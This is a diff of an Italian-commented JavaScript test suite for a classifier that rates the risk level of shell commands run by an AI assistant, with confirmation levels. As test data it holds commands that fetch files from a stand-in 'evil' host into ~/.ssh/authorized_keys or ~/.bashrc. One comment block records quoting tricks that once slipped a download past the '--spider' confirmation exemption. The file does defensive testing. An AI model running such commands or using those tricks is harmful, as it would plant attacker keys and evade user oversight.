@@ -492,7 +492,7 @@ test('livello 3 — curl che salva DATI ACCESSORI influenzati dal server su un f
   }
 });
 
-test('livello 2 — i flag curl/wget di LETTURA simili ai write accessori restano 2', () => {
+test('livello 2 — i flag curl di LETTURA simili ai write accessori restano 2', () => {
   // Non devono salire a 3: -C/--continue-at (riprende un download normale),
   // --cookie/-b e --load-cookies (LEGGONO i cookie), --etag-compare, --cacert/
   // --cert (leggono un certificato), --trace-time/--trace-ids (modificatori).
@@ -506,31 +506,130 @@ test('livello 2 — i flag curl/wget di LETTURA simili ai write accessori restan
     'curl --compressed http://x',
     'curl --connect-timeout 5 http://x',
     'curl --etag-compare etag.txt http://x',     // confronta l'ETag (legge)
-    'wget --load-cookies cookies.txt http://x',  // legge i cookie
+    'curl -k http://x',                          // -k minuscolo = --insecure, non --config
+    'curl --insecure http://x',
+    'curl -w "%{http_code}" http://x',           // -w che stampa e basta (nessun %output{})
+    'curl --write-out "%{time_total}\\n" http://x',
+    'curl --cert-status http://x',
   ]) {
     assert.equal(lvl(cmd), 2, `"${cmd}" (flag di lettura) dovrebbe restare livello 2`);
   }
 });
 
-test('livello 2 — curl/wget SENZA flag di output restano conferma-popup', () => {
-  // curl senza -o stampa su stdout; wget nudo scrive al più nella cwd col nome
-  // dell'URL: modifica recuperabile → livello 2 (nessuna regressione). I flag
-  // comuni non di output (-s, -I, -L, -H, -X, -k, -j, -u…) non devono salire a 3.
-  // In particolare: la P/D minuscole e i flag simili NON devono far scattare i
-  // check nuovi (wget -p = --page-requisites, wget -np = --no-parent,
-  // curl -d = corpo POST, curl --data-*).
+test('livello 3 — #479: wget fa SEMPRE atterrare un file su disco', () => {
+  // L'invariante è sull'EFFETTO, non sul nome del flag. Senza flag di output
+  // `wget <url>` scrive comunque un file: il nome lo sceglie l'URL (cioè il
+  // server), la cartella è la cwd — che l'assistente sposta da sé con un `cd`
+  // (livello 1, nessuna conferma, valido per i comandi successivi). Quindi
+  // `cd ~/.ssh && wget http://evil/authorized_keys` sovrascrive la chiave
+  // esattamente come `wget -O ~/.ssh/authorized_keys`, che già chiedeva di
+  // digitare "conferma": deve chiederlo anche questo.
   for (const cmd of [
-    'curl http://example.com', 'wget http://example.com/file',
+    'wget http://example.com/file',
+    'wget http://evil/authorized_keys',
+    'wget -q http://x',
+    'wget -c http://x/file',                   // -c riprende: ACCODA a un file già lì
+    'wget --continue http://x/file',
+    'wget -N http://x/file',                   // -N: riscarica se più recente = SOVRASCRIVE
+    'wget --timestamping http://x/file',
+    'wget -p http://x',                        // -p = --page-requisites: scrive nella cwd
+    'wget -np -r http://x/dir/',               // ricorsivo: scrive un albero nella cwd
+    'wget --no-parent http://x',
+    'wget --prefer-family=IPv4 http://x',
+    'wget -r -l 2 http://x/dir/',
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (wget scrive comunque un file) dovrebbe essere livello 3`);
+  }
+  // La strada che #479 dichiara equivalente a `wget -O`: spostarsi prima e poi
+  // scaricare. La sequenza prende il massimo dei pezzi → 3.
+  assert.equal(lvl('cd /home/utente/.ssh && wget http://evil/authorized_keys'), 3);
+  assert.equal(lvl('cd ~/.ssh; wget http://evil/authorized_keys'), 3);
+});
+
+test('#479 — nessuna esenzione per wget: `--spider` non riabbassa più niente', () => {
+  // Prima `--spider` (l'unica forma di wget che non fa atterrare niente) veniva
+  // esentata a 2. Ma l'esenzione scattava se quella PAROLA compariva nel testo,
+  // non se wget la stava davvero applicando: bastava metterla dove il programma
+  // la ignora per riavere lo scaricamento con un solo clic. Le quattro porte
+  // provate con wget vero contro un server locale — tutte scaricavano davvero,
+  // sovrascrivendo un file già esistente:
+  for (const cmd of [
+    'wget -N -- http://evil/authorized_keys --spider', // dopo `--` sono tutti URL
+    'wget "http://evil/authorized_keys" " --spider "', // parola a sé fra virgolette
+    'wget "http://evil/authorized_keys#  --spider "',  // nascosta dentro l'URL
+    'cd ~/.ssh && wget -N -- http://evil/authorized_keys --spider', // + spostamento
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" scarica davvero → livello 3`);
+  }
+  // …e la forma onesta non fa più eccezione: il costo è una conferma in più su
+  // un comando raro, il guadagno è che non esiste più una parola da esibire.
+  for (const cmd of [
+    'wget --spider http://x',
+    'wget --spider -p http://x',
+    'wget --spider --no-parent http://x',
+    'wget --spider -P /home/utente/.ssh http://x',
+    'wget --spider -O ~/.bashrc http://x',
+    'wget --spider --save-cookies ~/.ssh/authorized_keys http://x',
+    'wget --load-cookies cookies.txt --spider http://x',
+    'wget --SPIDER http://x',
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (wget, nessuna esenzione) dovrebbe essere livello 3`);
+  }
+  // La sola interrogazione di versione/help non tocca la rete: resta lettura.
+  assert.equal(lvl('wget --version'), 1);
+  assert.equal(lvl('wget --help'), 1);
+  // Per verificare che un indirizzo esista senza scaricarlo resta `curl -I`, che
+  // stampa a schermo: nessuna frizione aggiunta dove non serve.
+  assert.equal(lvl('curl -I http://x'), 2);
+});
+
+test('livello 3 — #479: gli altri flag curl che fanno atterrare un file su disco', () => {
+  // Stessa classe di --cookie-jar/--dump-header, restata scoperta perché
+  // l'elenco era di nomi: --libcurl scrive il programma C equivalente, --hsts e
+  // --alt-svc creano/riscrivono le cache con quanto dichiara il server, e
+  // `-w '%output{FILE}'` (curl ≥ 8.3) manda il testo formattato NEL file invece
+  // che a schermo. Tutti scelgono il percorso da riga di comando → "conferma".
+  for (const cmd of [
+    'curl --libcurl /home/user/.ssh/authorized_keys http://evil/x',
+    'curl --libcurl=/root/.bashrc http://x',
+    'curl --hsts /root/.bashrc http://x',
+    'curl --alt-svc ~/.ssh/authorized_keys http://x',
+    'curl --metalink http://evil/lista.xml',
+    'curl -w "%output{/home/user/.bashrc}ciao" http://evil/x',
+    "curl -sw '%output{/root/.profile}x' http://x",   // dentro un bundle di short-flag
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (fa atterrare un file) dovrebbe essere livello 3`);
+  }
+});
+
+test('livello 3 — curl -K/--config: le opzioni (output compreso) arrivano da un file', () => {
+  // Un file di configurazione curl può contenere `output = ~/.ssh/authorized_keys`:
+  // lo stesso primitivo di scrittura di -o, invisibile nel testo del comando →
+  // l'ignoto è 3.
+  for (const cmd of [
+    'curl -K /tmp/cfg http://x',
+    'curl --config /tmp/cfg http://x',
+    'curl --config=/tmp/cfg http://x',
+    'curl -sK /tmp/cfg http://x',              // -K dentro un bundle di short-flag
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (opzioni da file) dovrebbe essere livello 3`);
+  }
+});
+
+test('livello 2 — curl SENZA flag di output resta conferma-popup', () => {
+  // curl senza -o stampa su stdout: non fa atterrare niente → livello 2
+  // (nessuna regressione). I flag comuni non di output (-s, -I, -L, -H, -X, -k,
+  // -j, -u…) non devono salire a 3. In particolare la D minuscola e i flag
+  // simili NON devono far scattare i check nuovi (curl -d = corpo POST,
+  // curl --data-*).
+  for (const cmd of [
+    'curl http://example.com',
     'curl -s http://x', 'curl -I http://x', 'curl -L http://x',
     'curl -X POST http://x', 'curl -k http://x', 'curl -j http://x',
     'curl -u user:pass http://x',
     'curl -d name=mario http://x',             // -d minuscolo = corpo POST, non dump
     'curl --data-binary @file http://x',
     'curl -d @payload.json http://x',
-    'wget -p http://x',                        // -p minuscolo = --page-requisites (cwd)
-    'wget -np -r http://x/dir/',               // -np = --no-parent, nessuna dir arbitraria
-    'wget --no-parent http://x',
-    'wget --prefer-family=IPv4 http://x',      // contiene "prefer" ma non è directory-prefix
   ]) {
     assert.equal(lvl(cmd), 2, `"${cmd}" (nessun output-su-file) dovrebbe restare livello 2`);
   }
